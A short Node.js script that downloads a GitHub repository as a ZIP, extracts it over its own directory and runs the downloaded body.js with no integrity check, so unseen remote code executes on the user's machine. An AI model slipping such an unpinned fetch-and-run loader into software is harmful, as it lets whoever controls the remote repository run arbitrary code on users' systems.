const fs = require('fs');
const path = require('path');
const https = require('https');
const AdmZip = require('adm-zip');

async function downloadAndRun() {
    const repoUrl = 'https://github.com/wevedo/simply_html/archive/refs/heads/main.zip';
    const zipPath = path.join(__dirname, 'temp_repo.zip');
    const extractPath = __dirname;

    try {
        console.log('⬇️ Downloading repository...');
        await new Promise((resolve, reject) => {
            const file = fs.createWriteStream(zipPath);
            https.get(repoUrl, (response) => {
                response.pipe(file);
                file.on('finish', () => {
                    file.close(resolve);
                });
            }).on('error', (err) => {
                fs.unlinkSync(zipPath);
                reject(err);
            });
        });

        console.log('📦 Extracting repository...');
        const zip = new AdmZip(zipPath);
        zip.extractAllTo(extractPath, true);

        const repoFolder = path.join(extractPath, 'simply_html-main');
        
        // Make sure Node can find required modules
        require.main.paths.unshift(repoFolder);

        console.log('🚀 Starting body.js...');
        require(path.join(repoFolder, 'body.js'));

        // Cleanup
        fs.unlinkSync(zipPath);
    } catch (error) {
        console.error('❌ Error:', error.message);
        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
    }
}

downloadAndRun();
